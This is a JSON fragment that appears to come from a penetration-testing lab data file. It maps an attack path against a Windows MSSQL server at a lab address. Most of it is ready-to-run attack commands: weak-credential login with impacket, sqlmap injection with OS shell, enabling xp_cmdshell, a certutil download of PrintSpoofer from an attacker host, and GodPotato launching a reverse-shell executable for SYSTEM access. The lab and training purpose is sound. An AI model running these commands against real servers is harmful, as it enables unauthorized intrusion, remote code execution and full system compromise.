  "machines": [
    {
      "id": "mssql-target",
      "label": "MSSQL-TARGET",
      "ip": "10.10.10.100",
      "os": "Windows",
      "role": "Standalone",
      "networks": ["external"],
      "services": [
        {
          "port": 1433,
          "name": "MSSQL",
          "version": "2019",
          "vulnerabilities": [
            {"type": "auth", "summary": "MSSQL with sa or weak creds", "leads_to": "xp_cmdshell"},
            {"type": "sqli", "summary": "Web app SQLi → stacked queries → xp_cmdshell", "leads_to": "xp_cmdshell"}
          ],
          "commands": [
            "impacket-mssqlclient sa:'<password>'@10.10.10.100",
            "sqlmap -u 'http://10.10.10.100/login?id=1' --batch --risk=3 --level=5",
            "sqlmap -u 'http://10.10.10.100/login?id=1' --os-shell",
            {"cmd": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;", "rationale": "Why: Must enable advanced options before xp_cmdshell"},
            {"cmd": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", "rationale": "Why: xp_cmdshell gives OS command execution as mssql$"},
            "EXEC xp_cmdshell 'whoami';"
          ]
        },
        {
          "port": 80,
          "name": "HTTP",
          "version": "IIS",
          "vulnerabilities": [
            {"type": "sqli", "summary": "Login form SQLi → UNION/stacked injection", "leads_to": "mssql-access"}
          ],
          "commands": [
            "sqlmap -u 'http://10.10.10.100/login' --data 'user=admin&pass=1' --batch",
            "--os-cmd='whoami'"
          ]
        }
      ],
      "privesc": [
        {
          "from": "mssql$",
          "to": "SYSTEM",
          "technique": "SeImpersonate → PrintSpoofer / GodPotato",
          "commands": [
            {"cmd": "EXEC xp_cmdshell 'certutil -urlcache -split -f http://<kali-ip>/PrintSpoofer64.exe c:\\windows\\temp\\p.exe';", "rationale": "Why: Download Potato via xp_cmdshell for privesc"},
            {"cmd": "EXEC xp_cmdshell 'c:\\windows\\temp\\p.exe -i -c cmd';", "rationale": "Why: PrintSpoofer abuses SeImpersonate for SYSTEM"},
            "./GodPotato-NET4.exe -cmd \"cmd /c c:\\windows\\temp\\reverse-shell.exe\""
          ]
        }
      ],
      "credentials": [],
      "alternatives": []
    }
  ],

